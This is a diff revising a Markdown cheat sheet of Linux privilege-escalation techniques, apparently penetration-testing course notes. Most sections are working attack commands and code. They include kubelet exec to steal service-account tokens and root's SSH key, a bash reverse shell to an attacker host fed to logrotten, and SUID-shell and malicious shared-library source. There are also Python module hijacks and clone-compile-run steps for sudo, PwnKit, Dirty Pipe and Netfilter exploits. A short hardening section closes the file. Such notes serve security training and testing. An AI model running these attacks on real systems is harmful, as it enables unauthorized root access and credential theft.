-kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
-kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
-```
-
-Check what the token can do in the cluster:
-
-```bash
+kubeletctl -i --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <POD> -c <CONTAINER> | tee -a k8.token
+kubeletctl --server <TARGET_IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <POD> -c <CONTAINER> | tee -a ca.crt
 export token=`cat k8.token`
-kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 auth can-i --list # check granted permissions
 ```
 
-If it can create pods (`pods [get create list]`), deploy one that mounts the host root filesystem:
+If able to create/list pods, deploy a pod mounting the host root filesystem:
 
-```yaml
+```text
 apiVersion: v1
 kind: Pod
 metadata:
@@ -528,60 +588,45 @@ spec:
 
 ```bash
 kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 apply -f privesc.yaml
-kubectl --token=$token --certificate-authority=ca.crt --server=https://<TARGET_IP>:6443 get pods
-kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+kubeletctl --server <TARGET_IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc # read host root's SSH key
 ```
 
 ## Logrotate
 
-Manages/archives logs in `/var/log`, runs periodically via cron, configured through `/etc/logrotate.conf` + per-package files in `/etc/logrotate.d/`. Force a rotation with `-f`/`--force`, or set the date in the state file `/var/lib/logrotate.status`.
+Archives/rotates log files on schedule (size, age) via cron, controlled by `/etc/logrotate.conf` and `/etc/logrotate.d/`.
 
-Exploitation requirements:
+`-d` debug, no changes | `-f` force rotation | `-m` mail command | `-s` state file path | `--skip-state-lock` | `-v` verbose | `-l` log file or syslog
 
-1. write permission on the log files
-2. logrotate running as a privileged user/root
-3. vulnerable version: 3.8.6, 3.11.0, 3.15.0, or 3.18.0
-
-Confirm which mode logrotate uses — the exploit differs for `create` vs `compress`:
-
-```bash
-grep "create\|compress" /etc/logrotate.conf | grep -v "#"
-```
-
-Then logrotten (compile on the target or on a similar kernel and transfer):
+Requirements: write permission on the log file, logrotate runs as a privileged user/root, vulnerable version (3.8.6, 3.11.0, 3.15.0, 3.18.0).
 
 ```bash
 git clone https://github.com/whotwagner/logrotten.git
 cd logrotten
 gcc logrotten.c -o logrotten
-
-echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1' > payload
-
-./logrotten -p ./payload /tmp/tmp.log
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#" # confirm which option logrotate uses, exploit must match
+./logrotten -p ./payload <TARGET_FILE>
 ```
-
-Root reverse shell on the listener (`nc -nlvp 9001`).
 
 ## Miscellaneous Techniques
 
 ### Passive Traffic Capture
 
-If tcpdump is installed, unprivileged users may capture traffic. net-creds and PCredz parse the wire for credentials — credit card numbers, SNMP community strings, and Net-NTLMv2/SMBv2/Kerberos hashes for offline cracking. Cleartext protocols (HTTP, FTP, POP, IMAP, telnet, SMTP) may carry reusable credentials.
+If `tcpdump` is available to an unprivileged user, cleartext creds (HTTP, FTP, POP, IMAP, telnet, SMTP) or hashes (Net-NTLMv2, SMBv2, Kerberos) may be captured. Tools: net-creds, PCredz.
 
 ### Weak NFS Privileges
 
+NFS shares files over the network, port 2049.
+
 ```bash
-showmount -e <TARGET_IP>
+showmount -e <TARGET_IP> # list NFS exports
 ```
 
-`/etc/exports` options that matter:
+`root_squash` remaps root to `nfsnobody`, blocking SUID uploads | `no_root_squash` lets a remote root create files as root, SUID included
 
-- `root_squash` — root client becomes `nfsnobody`; uploaded files owned by nfsnobody, blocks SUID uploads
-- `no_root_squash` — remote root creates files on the server as root → SUID binaries possible
+Create a SUID shell on the attack box, mount the NFS export locally, copy it in and set the bit:
 
-With `no_root_squash` on a share (e.g. `/tmp *(rw,no_root_squash)`), build a SETUID shell on our own root machine and drop it on the share:
-
-```c
+```text
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -595,64 +640,53 @@ int main(void)
 
 ```bash
 gcc shell.c -o shell
-sudo mount -t nfs <TARGET_IP>:/tmp /mnt
+sudo mount -t nfs <TARGET_IP>:<SHARE> /mnt
 cp shell /mnt
 chmod u+s /mnt/shell
 ```
 
-Back in the low-privileged session on the target: `./shell` → root.
+Run the SUID binary from the low-privileged session on the target to get root.
 
 ### Hijacking Tmux Sessions
 
-A tmux session running as root with weak socket permissions is hijackable. Find them:
+A tmux session left running as a privileged user with weak socket permissions can be attached to by another group member.
 
 ```bash
-ps aux | grep tmux        # e.g. root running: tmux -S /shareds new -s debugsess
-ls -la /shareds           # srw-rw---- root devs
-id                        # our user in devs?
+tmux -S <SOCK_PATH> new -s <SESSION> # create shared session, as the privileged user
+chown root:<GROUP> <SOCK_PATH>
 ```
-
-Attach with the socket path:
 
 ```bash
-tmux -S /shareds
+tmux -S <SOCK_PATH> # attach, as a member of the owning group
 ```
-
-Root shell if the session owner is root.
 
 ## Kernel Exploits
 
-Public kernel exploits for many versions (Dirty COW / CVE-2016-5195 being the famous one). Legacy systems miss patches due to compatibility constraints, so vulnerable kernels are common. Caution on production — kernel exploits can destabilize or crash the host.
-
-Workflow:
+Public exploits exist for many kernel versions (e.g. Dirty COW, CVE-2016-5195).
 
 ```bash
-uname -a
-cat /etc/lsb-release
-```
-
-Google the exact kernel version for a PoC (e.g. `linux 4.4.0-116-generic exploit`), transfer, compile, run:
-
-```bash
+uname -a # kernel version, search for a matching public exploit
 gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
 ./kernel_exploit
 ```
 
-Some work out of the box, some need modification.
+Gotcha: can cause instability/crashes on production systems.
 
 ## Shared Libraries
 
-Dynamically linked libraries (`.so`) can be modified to control the calling program. Load locations: `-rpath`/`-rpath-link` at compile time, `LD_RUN_PATH`/`LD_LIBRARY_PATH` env vars, `/lib` and `/usr/lib` defaults, extra directories in `/etc/ld.so.conf`. `LD_PRELOAD` loads a library before execution, overriding default functions. List a binary's dependencies with `ldd`:
+Dynamic libraries (`.so`) can be swapped to control program execution, unlike static libraries (`.a`) which are baked into the binary at compile time.
 
 ```bash
-ldd /bin/ls
+ldd <BINARY> # list a binary's required shared libraries
 ```
+
+Search order: `-rpath`/`-rpath-link` at compile time, `LD_RUN_PATH`/`LD_LIBRARY_PATH` env vars, default `/lib`/`/usr/lib`, or `/etc/ld.so.conf`. `LD_PRELOAD` loads a library before the binary runs, ahead of defaults.
 
 ### LD_PRELOAD Privilege Escalation
 
-Requires sudo rights plus `env_keep+=LD_PRELOAD` in the sudoers Defaults. Even a non-GTFOBin command with an absolute path becomes exploitable — e.g. `(root) NOPASSWD: /usr/sbin/apache2 restart`. Library `root.c`:
+Needs a sudoers entry for a command that keeps `LD_PRELOAD` (`env_keep+=LD_PRELOAD`).
 
-```c
+```text
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -668,40 +702,26 @@ system("/bin/bash");
 
 ```bash
 gcc -fPIC -shared -o root.so root.c -nostartfiles
-sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+sudo LD_PRELOAD=/tmp/root.so <ALLOWED_SUDO_COMMAND>
 ```
-
-Full path to the library required. Root shell on execution.
 
 ## Shared Object Hijacking
 
-Custom binaries under development often load custom libraries. Find one with the setuid bit and inspect it:
+A SETUID binary linking a non-standard library via a writable RUNPATH can have that library replaced.
 
 ```bash
-ls -la payroll          # -rwsr-xr-x root root
-ldd payroll             # libshared.so => /development/libshared.so
-readelf -d payroll | grep PATH
-# RUNPATH: [/development]
+ldd <BINARY> # find the non-standard library path
+readelf -d <BINARY> | grep PATH # confirm writable RUNPATH
 ```
 
-The `RUNPATH` directory is checked first, before other configured locations. If it's world-writable (`drwxrwxrwx /development`), a malicious library there wins.
+Copy an existing library in to find the missing symbol name from the resulting error, then build a replacement exporting that function:
 
-Identify the function the binary calls — copy libc into place and run it, the error names the missing symbol:
-
-```bash
-cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
-./payroll
-# ./payroll: symbol lookup error: undefined symbol: dbquery
-```
-
-Compile a replacement providing `dbquery`:
-
-```c
+```text
 #include<stdio.h>
 #include<stdlib.h>
 #include<unistd.h>
 
-void dbquery() {
+void <FUNCTION_NAME>() {
     printf("Malicious library loaded\n");
     setuid(0);
     system("/bin/sh -p");
@@ -709,129 +729,117 @@ void dbquery() {
 ```
 
 ```bash
-gcc src.c -fPIC -shared -o /development/libshared.so
-./payroll
+gcc src.c -fPIC -shared -o <RUNPATH_DIR>/<LIBRARY_NAME>
 ```
 
-Root shell via the setuid binary.
+Run the SETUID binary again to get a root shell.
 
 ## Python Library Hijacking
 
-Three attack vectors, all requiring (or building on) the script running with elevated privileges. Note: the SUID bit on an interpreted script does nothing — Linux ignores it; it would have to be on `/usr/bin/python3` itself. Sudo rights to run the script are what matters.
+Python imports modules via `import`, wildcard import, or named import. Three attack vectors: insecure module write permissions, library search path priority, and the `PYTHONPATH` env var.
 
 ### Insecure Write Permissions
 
-`sudo -l` shows e.g. `(ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py`. The script imports a module and calls one of its functions:
-
-```python
-import psutil
-
-available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
-```
-
-Locate the module's function and check its permissions:
+A world-writable module imported by a script runnable as root (via sudo) lets you inject code into it.
 
 ```bash
-grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
-ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-# -rw-r--rw- root staff → group/world-writable
+sudo -l # check for NOPASSWD script run as root
+ls -l <SCRIPT>.py # SUID has no effect on interpreted scripts, rely on sudo instead
+grep -r "def <FUNCTION_NAME>" <SITE_PACKAGES_PATH>/* # find the module source defining the imported function
+ls -l <MODULE_PATH> # check for world-writable module file
 ```
 
-Inject at the top of the function:
+Insert code at the start of the target function in the module:
 
 ```python
-def virtual_memory():
-    #### Hijacking
-    import os
-    os.system('id')
-    ...
+import os
+os.system('id')
 ```
 
 ```bash
-sudo /usr/bin/python3 ./mem_status.py
+sudo /usr/bin/python3 <SCRIPT>.py # re-run to trigger injected code as root
 ```
-
-`uid=0` — the injected code runs as root. Replace `id` with any payload (reverse shell).
 
 ### Python Library Search Path
 
-Module resolution follows a priority order:
+Requires the imported module to sit in a lower-priority path, and a higher-priority path to be writable.
 
 ```bash
-python3 -c 'import sys; print("\n".join(sys.path))'
+python3 -c 'import sys; print("\n".join(sys.path))' # search order, higher = higher priority
+pip3 show <MODULE> # find the module's real install location
 ```
 
-If the imported module lives in a lower-priority path and we can write to a higher-priority one (e.g. `/usr/lib/python3.8` world-writable, sitting above the dist-packages install path of psutil), drop a module with the same name and the same function (and argument count — critical) into the higher-priority directory:
+Create a same-named module with a same-named, same-arity function in the writable higher-priority path:
 
 ```python
 #!/usr/bin/env python3
 
 import os
 
-def virtual_memory():
+def <FUNCTION_NAME>():
     os.system('id')
 ```
 
-Save as `psutil.py`, then `sudo /usr/bin/python3 mem_status.py` → root execution.
+```bash
+sudo /usr/bin/python3 <SCRIPT>.py
+```
 
 ### PYTHONPATH Environment Variable
 
-If `sudo -l` shows `SETENV:` on the python binary (env vars can be set under sudo), point the search path anywhere:
+Needs sudo rights on the python binary with `SETENV` (env vars aren't restricted under sudo's trusted context).
 
 ```bash
-sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+sudo -l # look for SETENV: NOPASSWD: /usr/bin/python3
+sudo PYTHONPATH=<WRITABLE_DIR> /usr/bin/python3 <SCRIPT>.py # forces import from a controlled directory
 ```
-
-With `psutil.py` in `/tmp/`, the hijacked module loads and runs as root.
 
 ## Sudo
 
-`sudo` executes processes as another user; `/etc/sudoers` defines who runs what. Inspect it:
+`/etc/sudoers` controls which users/groups can run which commands as which users.
 
 ```bash
-sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d' # view sudoers rules, requires password
 ```
 
-### CVE-2021-3156 — Heap-Based Buffer Overflow
+### CVE-2021-3156 (Baron Samedit)
 
-Affects sudo 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), and others. Check with `sudo -V | head -n1`. Public PoC:
+Heap-based buffer overflow. Affects sudo 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), 1.9.2 (Fedora 33), and others.
+
+```bash
+sudo -V | head -n1 # check sudo version
+cat /etc/lsb-release # confirm OS/version for exploit target selection
+```
 
 ```bash
 git clone https://github.com/blasty/CVE-2021-3156.git
 cd CVE-2021-3156
 make
-./sudo-hax-me-a-sandwich        # lists target IDs by OS/sudo version
-./sudo-hax-me-a-sandwich 1      # pick the matching ID
+./sudo-hax-me-a-sandwich <TARGET_INDEX> # lists available OS targets if run with no args
 ```
 
-Root shell.
+### Sudo Policy Bypass (CVE-2019-14287)
 
-### Sudo Policy Bypass — CVE-2019-14287
-
-All sudo versions below 1.8.28. Prerequisite: a sudoers entry allowing the user a command, e.g. `ALL=(ALL) /usr/bin/id`. Sudo accepts a user ID with `-u#`; specifying `-1` is processed as UID 0:
+Affects sudo < 1.8.28. Requires a sudoers entry allowing a specific command as a named (non-root) user.
 
 ```bash
-sudo -u#-1 id
+sudo -l # confirm e.g. ALL=(ALL) /usr/bin/id
+cat /etc/passwd | grep <USERNAME> # find target UID
+sudo -u#-1 <COMMAND> # UID -1 resolves to 0 (root)
 ```
-
-Immediate root shell.
 
 ## Polkit
 
-Authorization service for Linux. Relevant pieces:
+Authorization service mediating whether software can perform privileged actions. Config in `/usr/share/polkit-1/actions` (policies) and `/usr/share/polkit-1/rules.d` (rules); local overrides in `/etc/polkit-1/localauthority/50-local.d/*.pkla`.
 
-- actions/policies in `/usr/share/polkit-1/actions`
-- rules in `/usr/share/polkit-1/rules.d`
-- local authority rules: `.pkla` files in `/etc/polkit-1/localauthority/50-local.d`
-- `pkexec` (run a program as another user/root — sudo-like), `pkaction` (display actions), `pkcheck` (check a process's authorization)
+`pkexec` run a command as another user/root | `pkaction` list actions | `pkcheck` check if a process is authorized for an action
 
 ```bash
-pkexec -u root id
+pkexec -u <USERNAME> <COMMAND>
 ```
 
-### Pwnkit — CVE-2021-4034
+### CVE-2021-4034 (PwnKit)
 
-Memory corruption in pkexec, hidden for over ten years, published November 2021:
+Memory corruption in `pkexec`.
 
 ```bash
 git clone https://github.com/arthepsy/CVE-2021-4034.git
@@ -840,54 +848,62 @@ gcc cve-2021-4034-poc.c -o poc
 ./poc
 ```
 
-Root shell (switch from `sh` to `bash` after it lands).
+## Dirty Pipe (CVE-2022-0847)
 
-## Dirty Pipe
-
-CVE-2022-0847 — kernel vulnerability allowing writes to root-owned files the user can read. Affects kernels 5.8 through 5.17 (Android included). Similar in spirit to Dirty COW. Typical target: edit `/etc/passwd` to remove root's password → passwordless `su`.
+Allows writing to files the user only has read access to, via a pipe-based kernel bug. Affects kernels 5.8-5.17. Similar to Dirty COW.
 
 ```bash
+uname -r # confirm vulnerable kernel version
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
 cd CVE-2022-0847-DirtyPipe-Exploits
 bash compile.sh
-uname -r    # verify kernel in range
 ```
 
-Two exploit modes. `exploit-1` modifies `/etc/passwd` and drops a root shell (it backs the file up to `/tmp/passwd.bak` and sets root's password to "piped" during the run):
-
 ```bash
-./exploit-1
+./exploit-1 # backs up and edits /etc/passwd to drop root's password, then pops a root shell
 ```
 
-`exploit-2` hijacks SUID binaries — find one and pass its full path:
-
 ```bash
-find / -perm -4000 2>/dev/null
-./exploit-2 /usr/bin/sudo
+find / -perm -4000 2>/dev/null # find a SUID binary to target
+./exploit-2 /usr/bin/sudo # hijacks a SUID binary to pop a root shell via it
 ```
 
 ## Netfilter
 
-Kernel module for packet filtering/NAT; the layer behind iptables/arptables. Multiple recent privesc CVEs — relevant because companies often run old kernels in production, and containers still share the host kernel.
+Linux kernel module for packet filtering, NAT, and connection tracking; backs `iptables`/`arptables`.
 
-**CVE-2021-22555** — kernels 2.6–5.11:
+- Packet defragmentation
+- Connection tracking
+- Network address translation (NAT)
+
+### CVE-2021-22555
+
+Vulnerable kernels: 2.6-5.11.
 
 ```bash
+uname -r
 wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
 gcc -m32 -static exploit.c -o exploit
 ./exploit
 ```
 
-**CVE-2022-25636** — kernels 5.4 through 5.6.10, heap out-of-bounds write in `nf_dup_netdev.c`. Can corrupt the kernel — a reboot may be required to recover the box:
+### CVE-2022-25636
+
+Affects kernel 5.4-5.6.10 (`net/netfilter/nf_dup_netdev.c`, heap out-of-bounds write).
 
 ```bash
+uname -r
 git clone https://github.com/Bonfee/CVE-2022-25636.git
 cd CVE-2022-25636
 make
 ./exploit
 ```
 
-**CVE-2023-32233** — kernels up to 6.3.1, use-after-free in nf_tables anonymous sets:
+Gotcha: can corrupt the kernel and require a reboot to regain access.
+
+### CVE-2023-32233
+
+Use-after-free in nf_tables anonymous sets, kernel up to 6.3.1.
 
 ```bash
 git clone https://github.com/Liuk3r/CVE-2023-32233
@@ -896,14 +912,32 @@ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
 ./exploit
 ```
 
-All of these can be unstable and break the system.
-
 ## Linux Hardening
 
-Lynis audits a system's configuration and reports warnings/suggestions — runs unprivileged (some tests skipped) and works for pentesters as a quick baseline of the box's security state:
+Proper hardening can eliminate most opportunities for local privilege escalation.
+
+### Updates and Patching
+
+`unattended-upgrades` (Debian/Ubuntu) or `yum-cron` (RHEL) automate patching to close known-vulnerable kernel/service exploits.
+
+### Configuration Management
+
+- Audit writable files/dirs and SUID binaries.
+- Specify absolute paths in cron jobs and sudoers entries.
+- No cleartext credentials in world-readable files.
+- Clean up home directories and bash history.
+- Restrict write access to libraries called by privileged programs.
+- Remove unneeded packages/services.
+- Consider SELinux.
+
+### User Management
+
+Limit user/admin accounts, log logon attempts, enforce strong passphrases over forced rotation, prevent password reuse via `/etc/security/opasswd` with PAM, avoid excessive group membership, apply least privilege to sudo rights.
+
+### Audit
+
+Lynis audits Unix system configuration and gives hardening suggestions.
 
 ```bash
 ./lynis audit system
 ```
-
-The hardening checklist mirrors the attack surface: audit writable files/dirs and SUID binaries, absolute paths in cron and sudoers, no cleartext creds in world-readable files, clean home dirs and histories, low-priv users unable to modify custom libraries, minimal packages/sudo rights. Update and patch — `unattended-upgrades` (Ubuntu/Debian) and `yum-cron` (Red Hat) automate it.
